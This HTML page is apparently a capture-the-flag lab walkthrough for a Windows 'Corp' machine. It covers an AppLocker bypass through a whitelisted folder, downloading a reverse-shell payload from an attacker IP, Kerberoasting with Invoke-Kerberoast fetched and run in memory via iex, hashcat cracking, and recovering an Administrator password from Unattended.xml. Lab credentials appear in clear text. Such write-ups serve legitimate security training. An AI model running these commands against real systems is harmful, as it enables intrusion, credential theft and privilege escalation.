<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>corp</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>corp</h1><br/><strong><h2>Corp</h2></strong><br /><br />Bypass Windows Applocker and escalate your privileges. You will learn about kerberoasting, evading AV, bypassing applocker and escalating your privileges on a Windows system.<br /><br />Firstly We RDP into the machine.<br /><strong>Username: corp\dark<br />Password: _QuejVudId6</strong><br /><br /><br />Then we create a msfvenom reverse shell and send it to machine using the <strong>Target&#39;s Internet Explorer</strong> Or <strong>Powershell</strong><br /><br />As we are regular user, we cannot change trsuted site settings. Its blocking the download. Only option is to use Powershell.<br /><a href=""><img src="images/167-1.png" alt="images/167-1.png" /></a><br /><br /><br /><strong>Invoke-WebRequest -Uri http://10.11.72.31/SecurityUpdate.exe -OutFile SecurityUpdate.exe</strong><br /><br /><a href=""><img src="images/167-2.png" alt="images/167-2.png" /></a><br /><br />Note: Powershell is started with -ep bypass to bypass execution policy. Still the program gets blocked.<br />We try to run the program using explorer. We got the following error.<br /><br /><br /><a href=""><img src="images/167-3.png" alt="images/167-3.png" /></a><br /><br /><br /><br /><strong>AppLocker</strong> is an application whitelisting technology introduced with Windows 7. It allows restricting which programs users can execute based on the programs path, publisher and hash.<br /><br />You will have noticed with the deployed machine, you are unable to execute your own binaries and certain functions on the system will be restricted.<br /><br />There are many ways to bypass <strong>AppLocker</strong>.<br /><br />If AppLocker is configured with <strong>default AppLocker rules</strong>, we can bypass it by placing our executable in the following directory: <br /><strong>C:\Windows\System32\spool\drivers\color</strong> 		-		 This is whitelisted by default. <br /><br />Go ahead and use Powershell to download an executable of your choice locally, place it the whitelisted directory and execute it.<br /><br /><br />Now, we move to the whitelist directory and download our payload.<br />Hooray! We are able to execute the program now.<br /><br /><br />But However, the now that we have <strong>bypassed Applocker</strong>. The <strong>Anti Virus</strong> is <strong>blocking</strong> the executible.<br /><a href=""><img src="images/167-4.png" alt="images/167-4.png" /></a><br /><br /><br />Even Running with Explorer gives the same error.<br /><br /><a href=""><img src="images/167-5.png" alt="images/167-5.png" /></a><br /><br /><br /><br /><strong>Note: </strong>Just like Linux bash, Windows powershell saves all previous commands into a file called ConsoleHost_history. This is located at <strong>%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</strong><br /><br /><a href=""><img src="images/167-6.png" alt="images/167-6.png" /></a><br /><br /><strong>Note:</strong> We have to open with <strong>Run (Win + R)</strong> or in <strong>CMD.exe</strong> else in <strong>Powershell</strong> we need to specify full path instead of &quot;%userprofile%<br /><br /><a href=""><img src="images/167-7.png" alt="images/167-7.png" /></a><br /><br />We can find the flag in the history.<br />We move on to next task.<br /><br />Kerberos is the authentication system for Windows and Active Directory networks. There are many attacks against Kerberos, in this room we will use a Powershell script to request a service ticket for an account and acquire a ticket hash. We can then crack this hash to get access to another user account!<br /><br /><br /><br /><br />Lets first enumerate Windows. If we run <strong>setspn -T medin -Q​ */*</strong> we can extract all accounts in the SPN.<br />SPN is the Service Principal Name, and is the mapping between service and account.<br /><br /><strong>setspn -T medin -Q */*</strong><br /><br /><strong>Note: </strong>Runs on both <strong>cmd</strong> and <strong>powershell</strong><br /><br /><a href=""><img src="images/167-8.png" alt="images/167-8.png" /></a><br /><br />Now we have seen there is an SPN for a user(<strong>fela</strong>), we can use Invoke-Kerberoast and get a ticket.<br /><br />Lets first get the Powershell Invoke-Kerberoast script.<br /><br /><strong>iex​(New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1&#39;) </strong><br /><br />Now lets load this into memory: <strong>Invoke-Kerberoast -OutputFormat hashcat ​ |fl</strong><br />You should get a SPN ticket.<br /><br /><strong>Note:</strong> The Target machine was unable to connect to github so i copied the raw data from github to ca local kerberos.txt file and hosted it using python from the attacker machine.<br /><br /><br /><a href=""><img src="images/167-9.png" alt="images/167-9.png" /></a><br /><br /><br />Lets use hashcat to bruteforce this password. The type of hash we&#39;re cracking is Kerberos 5 TGS-REP etype 23 and the hashcat code for this is 13100.<br /><br /><strong>hashcat -m 13100 -​a 0 hash.txt wordlist --force</strong><br /><br />We gcrack the password. The credentials are<br /><strong>Username: fela<br />Password: rubenF124</strong><br /><br />Now we RDP into the machine with the new user. The flag is on the desktop.<br /><br /><strong><h3>Privilege Escalation</h3></strong><br /><br />We will use a PowerShell enumeration script to examine the Windows machine. We can then determine the best way to get Administrator access.<br /><br /><br />We will run PowerUp.ps1 for the enumeration.<br /><br />Lets load PowerUp1.ps1 into memory.<br /><br />i<strong>ex​(New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1&#39;) </strong><br /><strong>Invoke-AllChecks</strong><br /><br />The script has identified several ways to get Administrator access. The first being to <strong>bypassUAC</strong> and the second is <strong>UnattendedPath</strong>. We will be exploiting the UnattendPath way.<br /><br /><a href=""><img src="images/167-10.png" alt="images/167-10.png" /></a><br /><br />&quot;Unattended Setup is the method by which original equipment manufacturers (OEMs), corporations, and other users install Windows NT in unattended mode.&quot; <br /><br /><a href=""><img src="images/167-11.png" alt="images/167-11.png" /></a><br /><br />It is also where users passwords are stored in base64. Navigate to C:\Windows\Panther\Unattend\Unattended.xml.<br /><br /><a href=""><img src="images/167-12.png" alt="images/167-12.png" /></a><br /><br /><br />Now we have the Administrator password in base64 format. We will decode it to get Admin credentials.<br /><br /><a href=""><img src="images/167-13.png" alt="images/167-13.png" /></a><br /><br />Note: We decoded it in powershell itself. We could have decoded in kali machine. But the above works if <strong>certutil.exe</strong> is installed.<br /><br /><a href=""><img src="images/167-14.png" alt="images/167-14.png" /></a><br /><br />New Credentials found:<br /><br /><strong>Username: Administrator<br />Password: tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T</strong><br /><br />We RDP into the machine as Administrator and get the root flag.<br /><br />Thanks!!</div>
</body>
</html>
